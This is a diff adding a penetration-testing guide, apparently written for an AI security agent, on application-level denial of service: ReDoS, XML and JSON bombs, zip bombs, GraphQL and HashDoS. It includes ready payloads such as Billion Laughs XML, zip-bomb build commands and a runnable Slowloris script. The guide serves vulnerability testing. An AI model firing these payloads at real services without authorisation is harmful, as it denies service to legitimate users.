@@ -1,0 +1,440 @@
+<application_dos_guide>
+<title>APPLICATION-LEVEL DENIAL OF SERVICE</title>
+
+<critical>Application-level denial of service (DoS) vulnerabilities allow attackers to exhaust server resources with minimal requests by exploiting algorithmic complexity, regex patterns, or resource-intensive operations. Unlike volumetric DDoS, these attacks require low bandwidth but cause high server impact, making them difficult to mitigate with traditional defenses.</critical>
+
+<scope>
+- Regular Expression DoS (ReDoS): Catastrophic backtracking in regex patterns
+- Algorithmic complexity: O(n²) or worse operations on user-controlled input
+- XML/JSON bombs: Exponentially expanding payloads
+- Hash collision (HashDoS): Hash table worst-case performance
+- Resource exhaustion: Memory, CPU, disk, connection exhaustion
+- Recursion attacks: Deep recursion causing stack overflow
+- Zip/archive bombs: Compressed files that expand massively
+- Slowloris/slow attacks: Tying up connections with slow requests
+</scope>
+
+<methodology>
+1. Identify input-processing endpoints: File uploads, parsers, search, regex-based validation.
+2. Analyze regex patterns for catastrophic backtracking potential.
+3. Test algorithmic complexity with large inputs.
+4. Check for XML/JSON entity expansion vulnerabilities.
+5. Test file upload handling with crafted payloads.
+6. Measure server response times with increasing input sizes.
+7. Document resource consumption and DoS trigger conditions.
+</methodology>
+
+<discovery_techniques>
+<identify_targets>
+High-risk endpoints for application DoS:
+- File upload/processing: Image resize, PDF parse, archive extraction
+- Search functionality: Complex queries, regex search
+- Data export: Large dataset generation
+- Report generation: PDF, Excel, chart creation
+- Input validation: Email, URL, complex string validation
+- XML/JSON parsing: API endpoints accepting structured data
+- GraphQL: Complex nested queries
+- User content rendering: Markdown, BBCode, template processing
+</identify_targets>
+
+<regex_analysis>
+ReDoS vulnerable patterns (look for in source code or behavior):
+```
+# Evil patterns with nested quantifiers
+(a+)+$
+(a*)*$
+(a|aa)+$
+(.*a){x} where x > 10
+
+# Alternation with overlap
+(a|a)+$
+(.*|.*)$
+
+# Common vulnerable validators
+Email: ^([a-zA-Z0-9]+)*@
+URL: ^(https?:\/\/)?([a-z]+\.)*
+```
+
+Testing ReDoS:
+```
+# If pattern matches "aaa..."
+# Send: "aaaaaaaaaaaaaaaaaaaaaaaaa!"
+# Time increases exponentially with each 'a' added
+
+# Test progressively longer inputs
+python -c "print('a'*20 + '!')"
+python -c "print('a'*25 + '!')"
+python -c "print('a'*30 + '!')"
+# If 30 takes much longer than 20, ReDoS likely
+```
+</regex_analysis>
+
+<complexity_testing>
+Test algorithmic complexity:
+```python
+# O(n²) detection - time should increase quadratically
+import time
+for size in [100, 1000, 10000]:
+    start = time.time()
+    # Send request with input size
+    elapsed = time.time() - start
+    print(f"Size {size}: {elapsed}s")
+
+# If 10000 takes 100x longer than 1000, may be O(n²)
+```
+
+Common O(n²) or worse:
+- Nested loops in user-controlled operations
+- String concatenation in loops
+- Naive search algorithms
+- Sorting without limits
+</complexity_testing>
+
+<xml_bomb_testing>
+Billion Laughs attack (XML entity expansion):
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<root>&lol5;</root>
+```
+
+Quadratic blowup:
+```xml
+<!DOCTYPE bomb [
+  <!ENTITY a "aaaa...10KB of a's...aaaa">
+]>
+<bomb>&a;&a;&a;&a;&a;...many references...</bomb>
+```
+
+External entity for resource exhaustion:
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///dev/random">
+]>
+<foo>&xxe;</foo>
+```
+</xml_bomb_testing>
+
+<json_complexity>
+Deeply nested JSON:
+```python
+# Generate deeply nested object
+depth = 10000
+payload = '{"a":' * depth + '1' + '}' * depth
+
+# Wide JSON (many keys)
+payload = '{' + ','.join([f'"key{i}":1' for i in range(100000)]) + '}'
+```
+
+JSON parser vulnerabilities:
+- Stack overflow from deep nesting
+- Memory exhaustion from large arrays
+- CPU exhaustion from number parsing
+</json_complexity>
+</discovery_techniques>
+
+<attack_techniques>
+<redos_exploitation>
+ReDoS attack process:
+1. Identify regex pattern (from error, behavior, or source)
+2. Craft input that causes catastrophic backtracking
+3. Send payload and measure response time
+4. Scale payload to cause meaningful delay
+
+Example vulnerable patterns and payloads:
+```
+Pattern: ^(a+)+$
+Payload: "aaaaaaaaaaaaaaaaaaaaaaaaa!"
+
+Pattern: ^([a-zA-Z0-9])+@
+Payload: "aaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+
+Pattern: ^(.*)+$
+Payload: Any string with special char at end after many chars
+```
+</redos_exploitation>
+
+<zip_bomb>
+Zip bomb construction:
+```bash
+# Create nested zip bomb
+dd if=/dev/zero of=zero.txt bs=1M count=1000
+zip -9 bomb.zip zero.txt
+zip -9 bomb2.zip bomb.zip bomb.zip bomb.zip bomb.zip
+# Repeat nesting for exponential expansion
+```
+
+42.zip classic: 4KB compressed → 4.5PB decompressed
+
+Detection triggers:
+- Archive extraction endpoints
+- File preview/thumbnail generation
+- Malware scanning services
+- Document processing
+</zip_bomb>
+
+<graphql_dos>
+GraphQL complexity attacks:
+```graphql
+# Deeply nested query
+query {
+  user {
+    friends {
+      friends {
+        friends {
+          friends {
+            # Continue nesting...
+            name
+          }
+        }
+      }
+    }
+  }
+}
+
+# Alias overloading
+query {
+  u1: user(id: 1) { name }
+  u2: user(id: 2) { name }
+  # ... thousands of aliases
+  u10000: user(id: 10000) { name }
+}
+
+# Directive overloading
+query {
+  user @include(if: true) @include(if: true) @include(if: true) ... { name }
+}
+```
+</graphql_dos>
+
+<hash_collision>
+HashDoS (language-specific):
+```python
+# PHP hash collision (older versions)
+# Generate keys that hash to same bucket
+collision_keys = generate_collision_keys(10000)
+payload = '&'.join([f'{k}=1' for k in collision_keys])
+# POST this causes O(n²) hash table operations
+```
+
+Affected versions:
+- PHP < 5.3.9 (parameter limit added)
+- Java 7u6 (string hash randomization added)
+- Python 3.3+ (hash randomization by default)
+- Ruby 1.9+ (random hash seeds)
+</hash_collision>
+
+<slowloris>
+Slow HTTP attack:
+```python
+import socket
+import time
+
+# Open many connections, send slowly
+sockets = []
+for i in range(1000):
+    s = socket.socket()
+    s.connect(('target.com', 80))
+    s.send(b'GET / HTTP/1.1\r\n')
+    sockets.append(s)
+
+# Keep connections alive by sending headers slowly
+while True:
+    for s in sockets:
+        s.send(b'X-Custom: value\r\n')
+    time.sleep(10)
+```
+</slowloris>
+</attack_techniques>
+
+<exploitation>
+<redos_poc>
+Proof of concept steps:
+1. Identify input validated with regex
+2. Test timing with increasing payload:
+   ```
+   Time with 20 chars: 0.1s
+   Time with 25 chars: 1.5s
+   Time with 30 chars: 45s (exponential increase)
+   ```
+3. Document the payload and timing
+4. Calculate impact: "Single request ties up server for 45 seconds"
+
+Evidence format:
+- Input field/endpoint: email validation on /register
+- Pattern (if known): `^([a-zA-Z0-9]+)*@[a-zA-Z0-9]+\.[a-zA-Z]+$`
+- Payload: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`
+- Response time: 45 seconds (vs. 0.1s for normal input)
+</redos_poc>
+
+<xml_bomb_poc>
+Proof of concept:
+1. Find XML parsing endpoint
+2. Send billion laughs payload
+3. Monitor for:
+   - Memory spike on server
+   - Response timeout
+   - Server crash
+   - Error indicating resource exhaustion
+
+Evidence:
+- Endpoint: /api/import
+- Payload: [billion laughs XML]
+- Result: Server OOM or timeout after 30s
+</xml_bomb_poc>
+
+<complexity_poc>
+Proof of concept for algorithmic DoS:
+1. Send progressively larger inputs
+2. Plot response time vs input size
+3. Demonstrate non-linear growth
+
+Evidence:
+- Input size 1000: 100ms
+- Input size 10000: 10s (100x slower for 10x input = O(n²))
+- Input size 100000: 1000s (server effectively down)
+</complexity_poc>
+</exploitation>
+
+<validation>
+1. Demonstrate measurable performance impact (not just slow, but DoS-level).
+2. Show exponential or polynomial time increase with input size.
+3. Calculate requests needed to exhaust resources.
+4. Single-request DoS is more severe than multi-request.
+5. Document specific payload and resulting behavior.
+6. Verify in production-equivalent environment (dev may have different limits).
+7. Distinguish from rate limiting (intentional slowdown vs resource exhaustion).
+</validation>
+
+<false_positives>
+- Slow endpoints due to legitimate complex operations
+- Rate limiting causing delays (not DoS vulnerability)
+- Network latency issues
+- Development/debug mode with no optimization
+- Operations with documented resource limits
+- Timeouts preventing actual resource exhaustion
+- Sandboxed/limited parsing preventing exploitation
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. SLOW VS DOS:
+   WRONG: "Endpoint takes 5 seconds to respond, DoS vulnerability"
+   RIGHT: Slow responses are not automatically DoS:
+          - Some operations are legitimately slow
+          - Single slow request doesn't exhaust resources
+          - Must show resource exhaustion, not just slowness
+          Prove that attacker can actually deny service.
+
+2. THEORETICAL REDOS:
+   WRONG: "Regex pattern contains nested quantifiers, ReDoS vulnerable"
+   RIGHT: Not all nested quantifiers cause ReDoS:
+          - Pattern may have input length limits
+          - Timeout may prevent exploitation
+          - Actual testing required to confirm
+          Demonstrate actual exponential timing increase.
+
+3. XML BOMBS ON PROTECTED PARSERS:
+   WRONG: "Application parses XML, billion laughs attack possible"
+   RIGHT: Modern parsers often have protections:
+          - Entity expansion limits
+          - DTD disabled by default
+          - Max depth/size limits
+          - defusedxml, JAXP limits, etc.
+          Test actual exploitation, not just XML acceptance.
+
+4. RATE LIMITING CONFUSION:
+   WRONG: "Server slows down after many requests, DoS achievable"
+   RIGHT: This may be intentional rate limiting:
+          - Rate limiting is a defense mechanism
+          - Slowing attackers protects legitimate users
+          - Not a vulnerability if by design
+          DoS is about exhausting resources, not being rate limited.
+
+5. DEVELOPMENT ENVIRONMENT:
+   WRONG: "Local server crashed with payload, DoS confirmed"
+   RIGHT: Development environments differ from production:
+          - Less resources allocated
+          - Debug mode may be slower
+          - Missing production protections
+          Verify in production-equivalent environment.
+
+6. COMPLEXITY WITHOUT MEASUREMENT:
+   WRONG: "Algorithm appears O(n²), algorithmic complexity attack"
+   RIGHT: Must measure actual impact:
+          - Theoretical complexity may not be exploitable
+          - Input limits may prevent large inputs
+          - Caching may mitigate repeated requests
+          Prove with timing measurements.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. PROTECTED OPERATIONS:
+   - Timeouts preventing long-running operations
+   - Input length limits blocking large payloads
+   - Rate limiting slowing repeated requests
+   - Resource quotas (memory limits, CPU limits)
+
+2. INTENTIONALLY SLOW:
+   - Batch processing endpoints
+   - Report generation with known delays
+   - Data export with progress indicators
+   - Async operations returning immediately
+
+3. PARSER PROTECTIONS:
+   - DTD disabled in XML parsers
+   - Entity expansion limits
+   - Max nesting depth enforced
+   - defusedxml or equivalent libraries
+
+4. INFRASTRUCTURE MITIGATIONS:
+   - WAF blocking known DoS patterns
+   - CDN absorbing attack traffic
+   - Auto-scaling handling load
+   - Request size limits at proxy layer
+
+5. NON-EXPLOITABLE:
+   - Regex with input validation preventing evil strings
+   - Complexity attacks requiring authenticated access (limits scope)
+   - Resource exhaustion that only affects attacker's session
+
+6. TESTING ARTIFACTS:
+   - Development server with limited resources
+   - Debug mode with extra processing
+   - Single-threaded test deployment
+</expanded_false_positives>
+
+<impact>
+- Service unavailability: Legitimate users cannot access application
+- Resource exhaustion: Server CPU, memory, disk, or connections depleted
+- Cascading failures: One component failure affecting entire system
+- Financial loss: Downtime costs, SLA violations
+- Reputation damage: Users lose trust in service reliability
+- Incident response costs: Staff time to investigate and mitigate
+- Potential data loss: Crashes during write operations
+</impact>
+
+<pro_tips>
+1. ReDoS testing requires precise timing - use server-side timing if available.
+2. defusedxml (Python), JAXP limits (Java) prevent most XML bombs - check what's used.
+3. GraphQL depth/complexity limits are common - test if they're enforced.
+4. Hash collision attacks are mostly historical - modern languages have mitigations.
+5. Single-request DoS (one request causes minutes of processing) is highest severity.
+6. Zip bombs may be caught by AV - use custom compression for testing.
+7. Check for async/background processing - some DoS just queues work for later.
+8. Memory DoS may require multiple requests to accumulate memory leaks.
+9. Look for unbounded allocations: "Content-Length: 999999999999".
+10. Document CPU vs memory vs connection exhaustion - they have different impacts.
+</pro_tips>
+
+<remember>Application DoS vulnerabilities require demonstrating actual resource exhaustion that denies service to legitimate users, not just slow responses. Measure timing increases with input size, verify protections aren't in place, and calculate the practical impact. Single-request DoS causing significant server impact is most severe.</remember>
+</application_dos_guide>
